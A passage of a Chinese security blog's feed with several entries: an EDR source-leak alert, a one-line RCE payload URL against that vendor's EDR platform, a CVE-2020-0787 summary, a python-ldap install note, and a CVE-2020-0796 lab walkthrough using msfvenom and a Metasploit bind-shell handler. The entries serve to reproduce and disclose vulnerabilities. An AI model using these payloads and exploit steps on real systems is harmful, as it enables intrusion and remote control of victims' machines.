    <content type="html"><![CDATA[<h2 id="告警信息"><a href="#告警信息" class="headerlink" title="告警信息"></a>告警信息</h2><p>解决之前版本的远程任意代码注入漏洞，深x服EDR 更新到3.2.21 版本</p><p>更新文献：<a href="https://bbs.sangfor.com.cn/plugin.php?id=service:download&amp;action=view&amp;fid=100000022878128#/100000035115623/all/undefined" target="_blank" rel="noopener">https://bbs.sangfor.com.cn/plugin.php?id=service:download&amp;action=view&amp;fid=100000022878128#/100000035115623/all/undefined</a></p><p>早期可能误传导致源码泄露（现阶段官网社区已经删除）</p><p><img src="0.png" alt="0"></p><p>由于特殊时期，具体详情暂不描述</p><h2 id="风险"><a href="#风险" class="headerlink" title="风险"></a>风险</h2><p>源码泄露能被恶意攻击者进行代码审计分析，从而挖掘出新的漏洞，达到入侵目的。</p><h2 id="HW期间建议"><a href="#HW期间建议" class="headerlink" title="HW期间建议"></a>HW期间建议</h2><p>1.对EDR管理平台做acl策略，限制ip；</p><p>2.暂时下线</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;告警信息&quot;&gt;&lt;a href=&quot;#告警信息&quot; class=&quot;headerlink&quot; title=&quot;告警信息&quot;&gt;&lt;/a&gt;告警信息&lt;/h2&gt;&lt;p&gt;解决之前版本的远程任意代码注入漏洞，深x服EDR 更新到3.2.21 版本&lt;/p&gt;
&lt;p&gt;更新文献：&lt;a href=&quot;htt
      
    
    </summary>
    
    
      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
    
    
      <category term="告警信息" scheme="https://yejinpoxiao.xyz/tags/%E5%91%8A%E8%AD%A6%E4%BF%A1%E6%81%AF/"/>
    
  </entry>
  
  <entry>
    <title>深x服EDR终端检测平台RCE漏洞</title>
    <link href="https://yejinpoxiao.xyz/2020/08/17/%E6%B7%B1x%E6%9C%8DEDR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/"/>
    <id>https://yejinpoxiao.xyz/2020/08/17/%E6%B7%B1x%E6%9C%8DEDR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-08-17T15:02:48.856Z</published>
    <updated>2020-08-23T15:12:42.343Z</updated>
    
    <content type="html"><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>深x服终端检测响应平台EDR，围绕终端资产安全生命周期，通过预防、防御、检测、响应赋予终端更为细致的隔离策略、更为精准的查杀能力、更为持续的检测能力、更为快速的处置能力。在应对高级威胁的同时，通过云网端联动协同、威胁情报共享、多层级响应机制，帮助用户快速处置终端安全问题，构建轻量级、智能化、响应快的下一代终端安全系统。 </p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PAYLOAD：/tool/log/c.php?strip_slashes=system&amp;host=pwd</span><br></pre></td></tr></table></figure><p><img src="0.png" alt="0"></p><p><img src="1.png" alt="1"></p><h2 id="整改建议"><a href="#整改建议" class="headerlink" title="整改建议"></a>整改建议</h2><p>现阶段深x服终端检测响应平台EDR出现多处漏洞，官方暂未提供相关补丁更新，建议暂时下线此平台系统，等待后续更新修复漏洞后再上线。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;产品概述&quot;&gt;&lt;a href=&quot;#产品概述&quot; class=&quot;headerlink&quot; title=&quot;产品概述&quot;&gt;&lt;/a&gt;产品概述&lt;/h2&gt;&lt;p&gt;深x服终端检测响应平台EDR，围绕终端资产安全生命周期，通过预防、防御、检测、响应赋予终端更为细致的隔离策略、更为精准的查杀
      
    
    </summary>
    
    
      <category term="漏洞告警" scheme="https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"/>
    
    
      <category term="漏洞利用" scheme="https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>cve-2020-0787-Windows提权</title>
    <link href="https://yejinpoxiao.xyz/2020/06/22/cve-2020-0787-Windows%E6%8F%90%E6%9D%83/"/>
    <id>https://yejinpoxiao.xyz/2020/06/22/cve-2020-0787-Windows%E6%8F%90%E6%9D%83/</id>
    <published>2020-06-22T03:14:28.288Z</published>
    <updated>2020-09-18T01:46:34.875Z</updated>
    
    <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p><strong>Windows Background Intelligent Transfer Service 权限提升漏洞</strong></p><p>当Windows Background Intelligent Transfer Service  (BITS)未能正确地处理符号链接时，存在权限提升漏洞。成功利用此漏洞的攻击者可以覆盖导致提升状态的目标文件。要利用此漏洞，攻击者首先必须登录到系统。然后，攻击者可以运行巧尽心思构建的应用程序，利用此漏洞并控制受影响的系统。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Windows 10，Server 2016，Server 2019，Server version 1803，Server version 1903，Server version 1909，Windows 8.1，Server 2012，Server 2012 R2</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><img src="0.png" alt="0"></p><p><img src="1.png" alt="1"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;摘要&quot;&gt;&lt;a href=&quot;#摘要&quot; class=&quot;headerlink&quot; title=&quot;摘要&quot;&gt;&lt;/a&gt;摘要&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Windows Background Intelligent Transfer Service 权限提升漏洞&lt;/strong
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://yejinpoxiao.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="提权" scheme="https://yejinpoxiao.xyz/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>安装python-ldap模块过坑</title>
    <link href="https://yejinpoxiao.xyz/2020/06/19/%E5%AE%89%E8%A3%85python%E6%A8%A1%E5%9D%97%E8%BF%87%E5%9D%91/"/>
    <id>https://yejinpoxiao.xyz/2020/06/19/%E5%AE%89%E8%A3%85python%E6%A8%A1%E5%9D%97%E8%BF%87%E5%9D%91/</id>
    <published>2020-06-19T07:13:48.922Z</published>
    <updated>2020-06-19T07:32:21.282Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Linux安装python-ldap"><a href="#Linux安装python-ldap" class="headerlink" title="Linux安装python-ldap"></a>Linux安装python-ldap</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libsasl2-dev python-dev libldap2-dev libssl-dev</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install python-ldap</span><br></pre></td></tr></table></figure><h2 id="Windows安装python-ldap"><a href="#Windows安装python-ldap" class="headerlink" title="Windows安装python-ldap"></a>Windows安装python-ldap</h2><p>安装 whl 包：<a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#python-ldap" target="_blank" rel="noopener">https://www.lfd.uci.edu/~gohlke/pythonlibs/#python-ldap</a></p><p><img src="0.png" alt="0"></p><p>下载相对应的whl包，再安装即可</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pyldap-<span class="number">2</span>.<span class="number">4</span>.<span class="number">45</span>-cp37-cp37m-win_amd64.whl</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Linux安装python-ldap&quot;&gt;&lt;a href=&quot;#Linux安装python-ldap&quot; class=&quot;headerlink&quot; title=&quot;Linux安装python-ldap&quot;&gt;&lt;/a&gt;Linux安装python-ldap&lt;/h2&gt;&lt;figure c
      
    
    </summary>
    
    
      <category term="遇坑笔记" scheme="https://yejinpoxiao.xyz/categories/%E9%81%87%E5%9D%91%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="https://yejinpoxiao.xyz/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>永恒之黑(cve-2020-0796)配合msf获取shell</title>
    <link href="https://yejinpoxiao.xyz/2020/06/04/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91(cve-2020-0796)%E9%85%8D%E5%90%88msf%E8%8E%B7%E5%8F%96shell/"/>
    <id>https://yejinpoxiao.xyz/2020/06/04/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91(cve-2020-0796)%E9%85%8D%E5%90%88msf%E8%8E%B7%E5%8F%96shell/</id>
    <published>2020-06-04T07:05:29.171Z</published>
    <updated>2020-07-08T09:49:23.561Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>   今天看到tools上的cve-2020-0796复现文章，就此自己搭建一下环境复现，做一下笔记</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Windows 10 Version 1903， Windows Server Version 1903(Server Core  installation)，Windows 10 Version 1909， 和Windows Server Version  1909(Server Core installation)受到这个漏洞的影响。不过值得注意的是，引入SMBv3的Windows  8和Windows Server 2012也有可能受到影响。</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>GitHub上Fork过来的</p><p><a href="https://github.com/YGnight/SMBGhost_RCE_PoC" target="_blank" rel="noopener">https://github.com/YGnight/SMBGhost_RCE_PoC</a></p><p>kali集成</p><p>metasploit ：开源安全漏洞检测工具；</p><p>msfvenom ：metasploit的标准payload生成器</p><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>使用msfvenom生成直连exploit</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp lport=<span class="number">1314</span> -f py -o cve<span class="number">-2020</span><span class="number">-0796.</span>py</span><br></pre></td></tr></table></figure><p><img src="0.png" alt="0"></p><p>将生成的与脚本exploit.py里user_payload进行替换</p><p><img src="1.png" alt="1"></p><p>使用python3运行exploit （版本不要过高，本地复现使用的python3.7.4）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">exploit</span><span class="selector-class">.py</span> <span class="selector-tag">-ip</span> 192<span class="selector-class">.168</span><span class="selector-class">.168</span><span class="selector-class">.130</span></span><br></pre></td></tr></table></figure><p><img src="3.png" alt="3"></p><p>运行metasploit </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> payload /windows/x64/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">1314</span></span><br></pre></td></tr></table></figure><p><img src="4.png" alt="4"></p><p>指定目标机，run</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">130</span></span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="5.png" alt="5"></p><p>得到shell</p><p><img src="6.png" alt="6"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;   今天看到tools上的cve-2020-0796复现文章，就此自己搭建一下环境复现，做一下笔记&lt;/p&gt;
&lt;h2 id=&quot;影响范围&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://yejinpoxiao.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="提权" scheme="https://yejinpoxiao.xyz/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
</feed>
